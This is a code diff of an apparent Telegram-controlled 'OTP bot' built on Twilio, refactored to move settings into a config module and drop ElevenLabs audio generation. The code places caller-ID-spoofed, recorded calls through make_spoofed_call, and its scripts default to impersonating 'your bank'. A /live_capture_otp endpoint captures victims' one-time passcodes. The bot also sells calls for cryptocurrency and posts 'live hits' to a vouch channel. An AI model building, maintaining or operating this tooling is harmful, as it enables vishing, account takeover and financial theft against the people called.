@@ -81,29 +81,28 @@ import telebot
 from flask import Flask, request, send_file, Response
 from telebot import types
 from twilio.rest import Client
-from twilio.base.exceptions import TwilioRestException
 from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Say, Redirect, Connect, Stream
 from twilio.request_validator import RequestValidator
 from requests.auth import HTTPBasicAuth
-from gtts import gTTS
 from dotenv import load_dotenv
 from config import (
-    build_public_base_url,
-    build_media_stream_url,
-    USE_AI_FLOW,
-    DEFAULT_VOICE_ID,
-    DATABASE_URL,
-    USE_POSTGRES,
-    OUTBOUND_CALLER_ID,
+    BOT_TOKEN, ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID,
+    NGROK_URL, NGROK_TOKEN,
+    MAIN_CHANNEL_URL, BACKUP_CHANNEL_URL, VOUCH_CHANNEL_URL,
+    MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID, VOUCH_CHANNEL_ID,
+    OWNER_ID, ADMIN_ID, DEVELOPER_IDS,
+    FREE_TRIAL_TOTAL, PAYMENT_ADDRESSES,
+    LIVE_LISTEN_URL, LIVE_LISTEN_SECRET,
+    DISABLE_TWILIO_VALIDATION, DISABLE_AMD, AMD_ENABLED, DISABLE_DUMMY_BOT,
+    ABSTRACT_API_KEY,
+    RATE_LIMIT_CAPACITY, RATE_LIMIT_REFILL_RATE, RATE_LIMIT_MAX_VIOLATIONS,
+    RATE_LIMIT_BASE_BAN_DURATION, RATE_LIMIT_MAX_BAN_DURATION, RATE_LIMIT_BAN_ESCALATION_FACTOR,
+    FLASK_HOST, FLASK_PORT, DEBUG,
+    USE_WEBHOOK, WEBHOOK_URL, WEBHOOK_PATH, TELEGRAM_API_BASE_URL,
+    USE_AI_FLOW, DEFAULT_VOICE_ID, DATABASE_URL, USE_POSTGRES,
+    REQUIRED_CHANNELS, build_public_base_url,
 )
-from handlers.call_flow import amd_callback_flask
 from telebot.apihelper import ApiTelegramException
-try:
-    from ai.session import get_session as get_ai_session, remove_session as remove_ai_session, get_session_manager
-except ImportError:
-    get_ai_session = None
-    remove_ai_session = None
-    get_session_manager = None
 
 _http = requests.Session()
 _http_retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
@@ -139,141 +138,10 @@ def _notify_live_listen_start(call_sid: str, chat_id: Optional[int] = None, user
 
 
 # ======================================================================
-# CONFIGURATION
+# CONFIGURATION — all shared vars imported from config.py above
 # ======================================================================
-load_dotenv()
-
-SETTINGS_FILE = Path(__file__).parent / "conf" / "settings.txt"
 LOG_DIR = Path(__file__).parent / "conf"
 TWILIO_REQUEST_LOG = LOG_DIR / "twilio_live_calls.log"
-
-# Ensure Twilio request log exists from startup so errors are easier to find.
-try:
-    LOG_DIR.mkdir(parents=True, exist_ok=True)
-    if not TWILIO_REQUEST_LOG.exists():
-        TWILIO_REQUEST_LOG.write_text("", encoding="utf-8")
-    logging.getLogger(__name__).info(f"Twilio live log initialized at {TWILIO_REQUEST_LOG}")
-except Exception as e:
-    logging.getLogger(__name__).warning(f"Failed to initialize Twilio live log: {e}")
-
-
-def _load_settings():
-    if not SETTINGS_FILE.exists():
-        return {}
-    try:
-        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return {}
-
-_settings = _load_settings()
-
-def _get(key, default=None):
-    return os.getenv(key) or _settings.get(key) or default
-
-# Telegram
-BOT_TOKEN = _get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-# Twilio
-ACCOUNT_SID = _get("TWILIO_ACCOUNT_SID", "YOUR_TWILIO_SID_HERE")
-AUTH_TOKEN = _get("TWILIO_AUTH_TOKEN", "YOUR_TWILIO_AUTH_TOKEN_HERE")
-TWILIO_PHONE_NUMBER = _get("TWILIO_PHONE_NUMBER", "+1234567890")
-NGROK_URL = _get("NGROK_URL", "https://your-ngrok-url.ngrok-free.dev")
-NGROK_TOKEN = _get("NGROK_TOKEN", "")
-# Channels
-MAIN_CHANNEL_URL = _get("MAIN_CHANNEL_URL", "https://t.me/your_main_channel")
-BACKUP_CHANNEL_URL = _get("BACKUP_CHANNEL_URL", "https://t.me/your_backup_channel")
-VOUCH_CHANNEL_URL = _get("VOUCH_CHANNEL_URL", "https://t.me/your_vouch_channel")
-MAIN_CHANNEL_ID = _get("MAIN_CHANNEL_ID", "")
-BACKUP_CHANNEL_ID = _get("BACKUP_CHANNEL_ID", "")
-VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
-# Admins
-OWNER_ID = _get("OWNER_ID")
-if OWNER_ID is not None:
-    try:
-        OWNER_ID = int(OWNER_ID)
-    except:
-        OWNER_ID = None
-ADMIN_ID = _get("ADMIN_ID")
-if ADMIN_ID is not None:
-    try:
-        ADMIN_ID = int(ADMIN_ID)
-    except:
-        ADMIN_ID = None
-DEVELOPER_IDS_STR = _get("DEVELOPER_IDS", "")
-DEVELOPER_IDS = []
-if DEVELOPER_IDS_STR:
-    for pid in str(DEVELOPER_IDS_STR).split(","):
-        pid = pid.strip()
-        if pid and pid.isdigit():
-            DEVELOPER_IDS.append(int(pid))
-# Free trial
-FREE_TRIAL_TOTAL = int(_get("FREE_TRIAL_CALLS", "5"))
-# Payment addresses
-PAYMENT_ADDRESSES = {
-    "BTC": _get("PAYMENT_BTC", "YOUR_WALLET_ADDRESS_HERE"),
-    "ETH": _get("PAYMENT_ETH", "YOUR_WALLET_ADDRESS_HERE"),
-    "LTC": _get("PAYMENT_LTC", "YOUR_WALLET_ADDRESS_HERE"),
-    "USDT_ERC20": _get("PAYMENT_USDT", "YOUR_WALLET_ADDRESS_HERE"),
-}
-# ElevenLabs
-ELEVENLABS_API_KEY = _get("ELEVENLABS_API_KEY", "YOUR_ELEVENLABS_API_KEY_HERE")
-# Live Listen
-LIVE_LISTEN_URL = _get("LIVE_LISTEN_URL", NGROK_URL)
-LIVE_LISTEN_SECRET = _get("LIVE_LISTEN_SECRET", "")
-# Twilio validation override
-DISABLE_TWILIO_VALIDATION = _get("DISABLE_TWILIO_VALIDATION", "false").lower() in ("true", "1", "yes")
-# Disable Twilio Answering Machine Detection globally (default: disabled for simpler Media Stream flow)
-DISABLE_AMD = _get("DISABLE_AMD", "true").lower() in ("true", "1", "yes")
-AMD_ENABLED = not DISABLE_AMD
-# Disable DummyBot fallback in production or when explicitly requested
-DISABLE_DUMMY_BOT = _get("DISABLE_DUMMY_BOT", "false").lower() in ("true", "1", "yes")
-# Vouches channel for live hit posts
-VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
-# Abstract API (carrier lookup)
-ABSTRACT_API_KEY = _get("ABSTRACT_API_KEY", "")
-# Rate limiter
-RATE_LIMIT_CAPACITY = int(_get("RATE_LIMIT_CAPACITY", 10))
-RATE_LIMIT_REFILL_RATE = float(_get("RATE_LIMIT_REFILL_RATE", 1.0))
-RATE_LIMIT_MAX_VIOLATIONS = int(_get("RATE_LIMIT_MAX_VIOLATIONS", 5))
-RATE_LIMIT_BASE_BAN_DURATION = int(_get("RATE_LIMIT_BASE_BAN_DURATION", 300))
-RATE_LIMIT_MAX_BAN_DURATION = int(_get("RATE_LIMIT_MAX_BAN_DURATION", 86400))
-RATE_LIMIT_BAN_ESCALATION_FACTOR = float(_get("RATE_LIMIT_BAN_ESCALATION_FACTOR", 2.0))
-# Server
-FLASK_HOST = _get("FLASK_HOST", "0.0.0.0")
-FLASK_PORT = int(_get("FLASK_PORT", 5000))
-DEBUG = _get("DEBUG", "false").lower() in ("true", "1", "yes")
-
-# Telegram webhook mode
-USE_WEBHOOK = _get("USE_WEBHOOK", "false").lower() in ("true", "1", "yes")
-WEBHOOK_URL = _get("WEBHOOK_URL", "").strip()
-WEBHOOK_PATH = _get("WEBHOOK_PATH", "/telegram_webhook").strip()
-TELEGRAM_API_BASE_URL = _get(
-    "TELEGRAM_API_BASE_URL",
-    "https://tg-api-proxy.zaddocklangat8.workers.dev/bot"
-).rstrip("/")
-
-# Derived channel IDs
-def _derive_channel_id(url, fallback):
-    if fallback:
-        return fallback
-    if not url:
-        return None
-    url = url.strip().rstrip("/")
-    if url.endswith("t.me"):
-        return None
-    last = url.split("/")[-1]
-    if not last:
-        return None
-    if last.startswith("@"):
-        return last
-    if last.startswith("+"):
-        return url
-    return "@" + last
-
-MAIN_CHANNEL_ID = _derive_channel_id(MAIN_CHANNEL_URL, MAIN_CHANNEL_ID)
-BACKUP_CHANNEL_ID = _derive_channel_id(BACKUP_CHANNEL_URL, BACKUP_CHANNEL_ID)
-VOUCH_CHANNEL_ID = _derive_channel_id(VOUCH_CHANNEL_URL, VOUCH_CHANNEL_ID)
-REQUIRED_CHANNELS = [ch for ch in [MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID, VOUCH_CHANNEL_ID] if ch]
 
 # ======================================================================
 # LOGGING
@@ -324,7 +192,7 @@ from core.user_manager import (
 # GLOBAL CLIENTS
 # ======================================================================
 # Prefer services wrapper for Twilio call dispatch to ensure non-blocking behaviour
-from services.twilio_service import make_call_async, make_call_and_store_async, get_twilio_client
+from services.twilio_service import make_call, make_call_and_store_async, get_twilio_client
 
 twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN) if ACCOUNT_SID and "YOUR_" not in ACCOUNT_SID else None
 # Initialize bot with threaded=True for better concurrency and timeout handling
@@ -867,62 +735,38 @@ def run_callback_async(func, *args, **kwargs):
 
 logger.info("Callback executor initialized")
 
-# ElevenLabs
-eleven_client = None
-ELEVENLABS_MODEL = _get("ELEVENLABS_MODEL", "eleven_turbo_v2")
-if ELEVENLABS_API_KEY:
-    try:
-        from elevenlabs.client import ElevenLabs
-        import httpx
-        http_client = httpx.Client(timeout=httpx.Timeout(15.0, connect=10.0))
-        eleven_client = ElevenLabs(api_key=ELEVENLABS_API_KEY, httpx_client=http_client)
-        logger.info("[OK] ElevenLabs client initialized successfully")
-    except Exception as e:
-        logger.error(f"ElevenLabs client error: {e}")
-else:
-    logger.warning("ElevenLabs API key not set — voice generation will use Twilio TTS fallback")
-
 # ======================================================================
 # VOICE MAPPING (20 voices)
 # ======================================================================
 VOICE_MAPPING = {
-    "1": {"name": "Roger - Laid-Back, Casual, Resonant", "id": "CwhRBWXzGAHq8TQ4Fs17", "desc": "Laid-back, casual, resonant male"},
-    "2": {"name": "Sarah - Mature, Reassuring, Confident", "id": "EXAVITQu4vr4xnSDxMaL", "desc": "Warm mature female with steady confidence"},
-    "3": {"name": "Laura - Enthusiast, Quirky Attitude", "id": "FGY2WhTYpPnrIDTdsKH5", "desc": "Quirky, energetic female with charm"},
-    "4": {"name": "Charlie - Deep, Confident, Energetic", "id": "IKne3meq5aSn9XLyUdCD", "desc": "Deep, confident male with energy"},
-    "5": {"name": "George - Warm, Captivating Storyteller", "id": "JBFqnCBsd6RMkjVDRZzb", "desc": "Warm storytelling male voice"},
-    "6": {"name": "Callum - Husky Trickster", "id": "N2lVS1w4EtoT3dr4eOWO", "desc": "Husky male voice with playful edge"},
-    "7": {"name": "River - Relaxed, Neutral, Informative", "id": "SAz9YHcvj6GT2YYXdXww", "desc": "Relaxed informative voice"},
-    "8": {"name": "Harry - Fierce Warrior", "id": "SOYHLrjzK2X1ezoPC6cr", "desc": "Bold energetic male voice"},
-    "9": {"name": "Liam - Energetic, Social Media Creator", "id": "TX3LPaxmHKxFdv7VOQHJ", "desc": "Energetic modern male voice"},
-    "10": {"name": "Alice - Clear, Engaging Educator", "id": "Xb7hH8MSUJpSbSDYk0k2", "desc": "Clear, engaging female educator"},
-    "11": {"name": "Matilda - Knowledgable, Professional", "id": "XrExE9yKIg1WjnnlVkGX", "desc": "Professional female with authority"},
-    "12": {"name": "Will - Relaxed Optimist", "id": "bIHbv24MWmeRgasZH58o", "desc": "Relaxed, optimistic male"},
-    "13": {"name": "Jessica - Playful, Bright, Warm", "id": "cgSgspJ2msm6clMCkdW9", "desc": "Playful bright female voice"},
-    "14": {"name": "Eric - Smooth, Trustworthy", "id": "cjVigY5qzO86Huf0OWal", "desc": "Smooth trustworthy male"},
-    "15": {"name": "Bella - Professional, Bright, Warm", "id": "hpp4J3VqNfWAUOO0d1Us", "desc": "Bright professional female"},
-    "16": {"name": "Chris - Charming, Down-to-Earth", "id": "iP95p4xoKVk53GoZ742B", "desc": "Charming down-to-earth male"},
-    "17": {"name": "Brian - Deep, Resonant and Comforting", "id": "nPczCjzI2devNBz1zQrb", "desc": "Deep resonant comforting male"},
-    "18": {"name": "Daniel - Steady Broadcaster", "id": "onwK4e9ZLuTAKqWW03F9", "desc": "Steady broadcaster male"},
-    "19": {"name": "Lily - Velvety Actress", "id": "pFZP5JQG7iQjIQuC4Bku", "desc": "Velvety actress voice"},
-    "20": {"name": "Adam - Dominant, Firm", "id": "pNInz6obpgDQGcFmaJgB", "desc": "Dominant firm male"},
+    "1": {"provider": "elevenlabs", "name": "Roger - Laid-Back, Casual, Resonant", "id": "CwhRBWXzGAHq8TQ4Fs17", "desc": "Laid-back, casual, resonant male"},
+    "2": {"provider": "elevenlabs", "name": "Sarah - Mature, Reassuring, Confident", "id": "EXAVITQu4vr4xnSDxMaL", "desc": "Warm mature female with steady confidence"},
+    "3": {"provider": "elevenlabs", "name": "Laura - Enthusiast, Quirky Attitude", "id": "FGY2WhTYpPnrIDTdsKH5", "desc": "Quirky, energetic female with charm"},
+    "4": {"provider": "elevenlabs", "name": "Charlie - Deep, Confident, Energetic", "id": "IKne3meq5aSn9XLyUdCD", "desc": "Deep, confident male with energy"},
+    "5": {"provider": "elevenlabs", "name": "George - Warm, Captivating Storyteller", "id": "JBFqnCBsd6RMkjVDRZzb", "desc": "Warm storytelling male voice"},
+    "6": {"provider": "elevenlabs", "name": "Callum - Husky Trickster", "id": "N2lVS1w4EtoT3dr4eOWO", "desc": "Husky male voice with playful edge"},
+    "7": {"provider": "elevenlabs", "name": "River - Relaxed, Neutral, Informative", "id": "SAz9YHcvj6GT2YYXdXww", "desc": "Relaxed informative voice"},
+    "8": {"provider": "elevenlabs", "name": "Harry - Fierce Warrior", "id": "SOYHLrjzK2X1ezoPC6cr", "desc": "Bold energetic male voice"},
+    "9": {"provider": "elevenlabs", "name": "Liam - Energetic, Social Media Creator", "id": "TX3LPaxmHKxFdv7VOQHJ", "desc": "Energetic modern male voice"},
+    "10": {"provider": "elevenlabs", "name": "Alice - Clear, Engaging Educator", "id": "Xb7hH8MSUJpSbSDYk0k2", "desc": "Clear, engaging female educator"},
+    "11": {"provider": "elevenlabs", "name": "Matilda - Knowledgable, Professional", "id": "XrExE9yKIg1WjnnlVkGX", "desc": "Professional female with authority"},
+    "12": {"provider": "elevenlabs", "name": "Will - Relaxed Optimist", "id": "bIHbv24MWmeRgasZH58o", "desc": "Relaxed, optimistic male"},
+    "13": {"provider": "elevenlabs", "name": "Jessica - Playful, Bright, Warm", "id": "cgSgspJ2msm6clMCkdW9", "desc": "Playful bright female voice"},
+    "14": {"provider": "elevenlabs", "name": "Eric - Smooth, Trustworthy", "id": "cjVigY5qzO86Huf0OWal", "desc": "Smooth trustworthy male"},
+    "15": {"provider": "elevenlabs", "name": "Bella - Professional, Bright, Warm", "id": "hpp4J3VqNfWAUOO0d1Us", "desc": "Bright professional female"},
+    "16": {"provider": "elevenlabs", "name": "Chris - Charming, Down-to-Earth", "id": "iP95p4xoKVk53GoZ742B", "desc": "Charming down-to-earth male"},
+    "17": {"provider": "elevenlabs", "name": "Brian - Deep, Resonant and Comforting", "id": "nPczCjzI2devNBz1zQrb", "desc": "Deep resonant comforting male"},
+    "18": {"provider": "elevenlabs", "name": "Daniel - Steady Broadcaster", "id": "onwK4e9ZLuTAKqWW03F9", "desc": "Steady broadcaster male"},
+    "19": {"provider": "elevenlabs", "name": "Lily - Velvety Actress", "id": "pFZP5JQG7iQjIQuC4Bku", "desc": "Velvety actress voice"},
+    "20": {"provider": "elevenlabs", "name": "Adam - Dominant, Firm", "id": "pNInz6obpgDQGcFmaJgB", "desc": "Dominant firm male"},
 }
 logger.info(f"[VOICES] {len(VOICE_MAPPING)} voices loaded — default: {VOICE_MAPPING['1']['name']} ({VOICE_MAPPING['1']['id']})")
-
-def get_default_voice_id() -> str:
-    default_voice = VOICE_MAPPING.get("1", {}).get("id")
-    if default_voice:
-        return default_voice
-    for voice in VOICE_MAPPING.values():
-        if voice.get("id"):
-            return voice["id"]
-    return ""
 
 
 def resolve_voice_id(user_id: str, file_name: str = "Voice.txt") -> str:
     """Return the selected voice id for a user, falling back to the shared default."""
     voice_id = read_user_file(user_id, file_name, "").strip()
-    return voice_id or get_default_voice_id()
+    return voice_id or DEFAULT_VOICE_ID
 
 # Function to show all voice options to the user
 def show_voice_options(chat_id):
@@ -1125,7 +969,7 @@ def build_manual_call_review_text(user_id: str, title: str = "🟢 MANUAL CALL R
     delay = read_user_file(user_id, "manual_delay.txt", "0").strip() or "0"
     fallback = read_user_file(user_id, "manual_fallback.txt", "").strip()
     digits = read_user_file(user_id, "manual_digits.txt", "0").strip() or "0"
-    voice_id = read_user_file(user_id, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+    voice_id = read_user_file(user_id, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
     voice_name = read_user_file(user_id, "manual_voice_name.txt", "Custom") or "Custom"
     caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
     script_preview = script if len(script) <= 150 else f"{script[:150]}..."
@@ -1181,7 +1025,7 @@ def build_custom_call_review_text(user_id: str, title: str = "🟢 CUSTOM CALL R
     delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
     fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
     digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
-    voice_id = read_user_file(user_id, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+    voice_id = read_user_file(user_id, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
     voice_name = read_user_file(user_id, "custom_voice_name.txt", "Custom") or "Custom"
     caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
     script_preview = script if len(script) <= 150 else f"{script[:150]}..."
@@ -1597,7 +1441,7 @@ def get_call_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, s
         voice_id = resolve_voice_id(user_id, "Voice.txt")
         voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
         return voice_id, voice_name
-    return get_default_voice_id(), ""
+    return DEFAULT_VOICE_ID, ""
 
 
 def get_call_setting(call_sid: str, user_id: str, key: str, file_name: Optional[str] = None, default: str = "") -> str:
@@ -2412,7 +2256,7 @@ def get_normal_script_for_preview(user_id: str) -> str:
 
 # ======================================================================
 # AUDIO GENERATION - SIMPLIFIED
-# All audio is now generated on-demand in the /voice endpoint using generate_call_audio()
+# (Legacy — audio generation removed; Vapi handles TTS)
 
 
 def get_audio_url(user_id: str, filename: str) -> str:
@@ -2442,86 +2286,6 @@ def _run_with_timeout(func, args=(), kwargs=None, timeout=15):
         raise error[0]
     return result[0]
 
-def generate_call_audio(
-    user_id: str,
-    text: str,
-    voice_id: str,
-    filename: str = "call_audio.mp3",
-    max_retries: int = 1
-) -> Optional[str]:
-    if not ELEVENLABS_API_KEY:
-        logger.error("ElevenLabs API key not configured")
-        return None
-
-    models_to_try = [ELEVENLABS_MODEL or "eleven_turbo_v2", "eleven_flash_v2_5"]
-    voices_to_try = [voice_id]
-    default_voice = get_default_voice_id()
-    if default_voice and default_voice not in voices_to_try:
-        voices_to_try.append(default_voice)
-    client = eleven_client
-    if client is None:
-        from elevenlabs.client import ElevenLabs
-        client = ElevenLabs(api_key=ELEVENLABS_API_KEY)
-
-    output_path = user_conf_path(user_id) / filename
-    ensure_user_path(user_id)
-    try:
-        if output_path.exists() and output_path.stat().st_size > 1024:
-            return get_audio_url(user_id, filename)
-    except Exception:
-        pass
-
-    for attempt in range(max_retries + 1):
-        for model in models_to_try:
-            for vid in voices_to_try:
-                try:
-                    gen = _run_with_timeout(
-                        client.text_to_speech.convert,
-                        kwargs={
-                            "voice_id": vid,
-                            "model_id": model,
-                            "text": text,
-                            "output_format": "mp3_44100_128",
-                        },
-                        timeout=12
-                    )
-                    if gen is None:
-                        logger.debug(f"Audio timeout ({vid}/{model})")
-                        continue
-
-                    with open(output_path, "wb") as f:
-                        for chunk in gen:
-                            if chunk:
-                                f.write(chunk)
-
-                    audio_url = get_audio_url(user_id, filename)
-                    logger.info(f"[OK] Audio generated voice={vid} model={model}: {audio_url}")
-                    return audio_url
-
-                except Exception as e:
-                    err_msg = str(e)[:120] if str(e) else type(e).__name__
-                    logger.debug(f"Audio fail ({vid}/{model}): {err_msg}")
-                    continue
-        if attempt < max_retries:
-            time.sleep(0.5)
-
-    logger.warning(f"Audio failed for voice_id={voice_id}, using fallback text")
-    return None
-
-
-def generate_call_audio_batch(user_id: str, voice_id: str, items: list) -> None:
-    results = [None] * len(items)
-    def _gen(i, text, fname):
-        results[i] = generate_call_audio(user_id=user_id, text=text, voice_id=voice_id, filename=fname)
-    threads = []
-    for i, (text, fname) in enumerate(items):
-        t = threading.Thread(target=_gen, args=(i, text, fname), daemon=True)
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join(timeout=15)
-
-
 def add_prompt_to_gather(gather: Gather, user_id: str, filename: str, fallback_text: str) -> None:
     # Always try to play audio if user_id and filename are provided
     if user_id and filename:
@@ -2547,8 +2311,9 @@ def _safe_caller_id(caller_id: Optional[str]) -> str:
         return TWILIO_PHONE_NUMBER
     return cleaned
 
-def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: str, user_id: str,
-                      chat_id: Optional[int] = None, call_record: bool = True, machine_detection: bool = True) -> Optional[str]:
+def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
+                      chat_id: Optional[int] = None, call_record: bool = True, machine_detection: bool = True,
+                      **kwargs) -> Optional[str]:
     if not is_twilio_configured():
         logger.error("Twilio not configured")
         return None
@@ -2648,6 +2413,8 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
                     "machine_detection_speech_end_threshold": call_params.get("machine_detection_speech_end_threshold"),
                     "machine_detection_silence_timeout": call_params.get("machine_detection_silence_timeout"),
                 })
+            if kwargs:
+                dispatch_kwargs.update(kwargs)
             fut = make_call_and_store_async(**dispatch_kwargs)
             # If the caller expects a SID string, try to return quickly if available; otherwise return future
             try:
@@ -2658,23 +2425,8 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
             except Exception:
                 return fut
         except Exception as exc:
-            logger.debug("Background call dispatch creation failed, falling back to direct call: %s", exc)
-            try:
-                call = asyncio.run(asyncio.to_thread(twilio_client.calls.create, **call_params))
-                return call.sid
-            except Exception as direct_exc:
-                logger.error("Direct Twilio call creation fallback failed: %s", direct_exc)
-                return None
-    except TwilioRestException as e:
-        twilio_error = {
-            "status": getattr(e, "status", None),
-            "code": getattr(e, "code", None),
-            "msg": getattr(e, "msg", str(e)),
-            "uri": getattr(e, "uri", None),
-        }
-        logger.error("Call failed: TwilioRestException %s", json.dumps({k: v for k, v in twilio_error.items() if v is not None}))
-        logger.debug("Twilio call params: %s", {k: v for k, v in call_params.items() if k != "url"})
-        return None
+            logger.debug("Background call dispatch failed: %s", exc)
+            return None
     except Exception as e:
         logger.error("Call failed: %s", e)
         logger.debug("Twilio call params: %s", {k: v for k, v in call_params.items() if k != "url"})
@@ -2812,11 +2564,6 @@ def _load_scheduled_params(user_id: str, schedule_id: str) -> Optional[dict]:
 
 
 def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotion: str = "neutral", status_message_id: Optional[int] = None) -> None:
-    """Start an AI Emotion Call with specified emotion via Media Stream + Groq.
-    
-    Emotion options: neutral, cheerful, angry, fear, surprise
-    Routes through /ai_start → Media Stream WebSocket → Groq with emotion-modulated responses
-    """
     try:
         ensure_user_path(user_id_str)
         # Compute current setup hash to prevent reuse of a previously completed setup
@@ -2843,32 +2590,15 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 
-                if USE_AI_FLOW:
-                    public_base = build_public_base_url() or NGROK_URL
-                    webhook_url = (
-                        f"{public_base.rstrip('/')}/ai_start"
-                        f"?user_id={quote_plus(str(user_id_str))}"
-                        f"&chat_id={quote_plus(str(chat_id))}"
-                        f"&name={quote_plus(name)}"
-                        f"&company={quote_plus(company)}"
-                        f"&voice_id={quote_plus(voice_id)}"
-                        f"&emotion={quote_plus(emotion)}"
-                        f"&code_length={quote_plus(code_length)}"
-                        f"&call_type=emotion"
-                        f"&mode_label=AI%20Emotion%20Call"
-                    )
-                else:
-                    bot.send_message(chat_id, "❌ AI flow is disabled. Cannot start emotion call.")
-                    return
-                
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
                     caller_id=caller_id,
-                    webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     call_record=True,
+                    code_length=code_length,
+                    emotion=emotion,
                 )
                 if not sid:
                     raise Exception("Failed to create emotion call")
@@ -3019,32 +2749,15 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 )
                 bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
 
-                public_base = build_public_base_url() or NGROK_URL
-                webhook_url = (
-                    f"{public_base.rstrip('/')}/ai_start"
-                    f"?user_id={quote_plus(str(user_id_str))}"
-                    f"&chat_id={quote_plus(str(chat_id))}"
-                    f"&name={quote_plus(name)}"
-                    f"&company={quote_plus(company)}"
-                    f"&from_name={quote_plus(from_name)}"
-                    f"&voice_id={quote_plus(voice_id)}"
-                    f"&emotion={quote_plus(emotion)}"
-                    f"&language={quote_plus(language)}"
-                    f"&delivery={quote_plus(delivery)}"
-                    f"&code_length={quote_plus(code_length)}"
-                    f"&caller_id={quote_plus(caller_id)}"
-                    f"&call_type=normal"
-                    f"&mode_label={quote_plus(mode_label or 'Normal Call')}"
-                )
                 
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
                     caller_id=caller_id,
-                    webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
-                    call_record=True,  # CRITICAL: Enable full-call recording from start to end
+                    call_record=True,
+                    code_length=code_length,
                 )
                 if not sid:
                     raise Exception("Failed to create normal call")
@@ -3180,54 +2893,25 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             emotion = params.get("emotion", "neutral") or "neutral"
             code_length = str(params.get("code_length", "6") or "6")
             mode_label = "Manual Call" if schedule_type == "manual" else "Custom Call"
-            public_base = build_public_base_url() or NGROK_URL
-            webhook_url = (
-                f"{public_base.rstrip('/')}/ai_start"
-                f"?user_id={quote_plus(str(user_id))}"
-            )
-            if chat_id is not None:
-                webhook_url += f"&chat_id={quote_plus(str(chat_id))}"
-            if script:
-                webhook_url += f"&custom_script={quote_plus(script)}"
-            webhook_url += (
-                f"&name={quote_plus(read_user_file(user_id, 'Name.txt', 'Customer'))}"
-                f"&company={quote_plus(read_user_file(user_id, 'Company Name.txt', 'your bank'))}"
-                f"&voice_id={quote_plus(voice_id)}"
-                f"&emotion={quote_plus(emotion)}"
-                f"&code_length={quote_plus(code_length)}"
-                f"&call_type={quote_plus(schedule_type)}"
-                f"&mode_label={quote_plus(mode_label)}"
-            )
             sid = make_spoofed_call(
                 to=phone,
                 from_number=OUTBOUND_CALLER_ID,
                 caller_id=caller_id,
-                webhook_url=webhook_url,
                 user_id=user_id,
                 chat_id=chat_id,
                 call_record=True,
+                code_length=code_length,
+                custom_instructions=script or None,
             )
         else:
             emotion = sched.get("emotion", "neutral")
-            public_base = build_public_base_url() or NGROK_URL
-            webhook_url = (
-                f"{public_base.rstrip('/')}/ai_start"
-                f"?user_id={quote_plus(str(user_id))}"
-            )
-            if chat_id is not None:
-                webhook_url += f"&chat_id={quote_plus(str(chat_id))}"
-            webhook_url += (
-                f"&emotion={quote_plus(str(emotion))}"
-                f"&call_type=normal"
-                f"&mode_label=Normal%20Call"
-            )
             sid = make_spoofed_call(
                 to=phone,
                 from_number=OUTBOUND_CALLER_ID,
                 caller_id=read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER),
-                webhook_url=webhook_url,
                 user_id=user_id,
                 chat_id=chat_id,
+                code_length=read_user_file(user_id, "CodeLength.txt", "6"),
             )
         if sid:
             sched["status"] = "completed"
@@ -3440,9 +3124,8 @@ def serve_audio():
         return Response("", status=404)
     return send_file(path, mimetype="audio/mpeg")
 
-@app.route("/live_capture_otp", methods=["POST"])
-@twilio_request_logger("/live_capture_otp")
-def live_capture_otp():
+# ======================================================================
+# CALL HISTORY
     if not validate_live_listen_request():
         return Response("Unauthorized", status=401)
 
@@ -3511,7 +3194,7 @@ def live_capture_otp():
             resp = VoiceResponse()
             say_auto = "Verification successful. Thank you. Goodbye."
             voice_id, _ = get_call_voice_info(call_sid, session_local.get("user_id") or "unknown")
-            audio_auto = generate_call_audio(user_id=session_local.get("user_id") or "unknown", text=say_auto, voice_id=voice_id, filename="otp_auto_accept.mp3")
+            audio_auto = None
             if audio_auto:
                 resp.play(audio_auto)
             else:
@@ -3534,1607 +3217,6 @@ def live_capture_otp():
 
 
 
-@app.route("/amd_hangup", methods=["POST"])
-@twilio_request_logger("/amd_hangup")
-def amd_hangup():
-    resp = VoiceResponse()
-    resp.say("Thank you for your time. Goodbye.")
-    resp.hangup()
-    return Response(str(resp), content_type="application/xml")
-
-
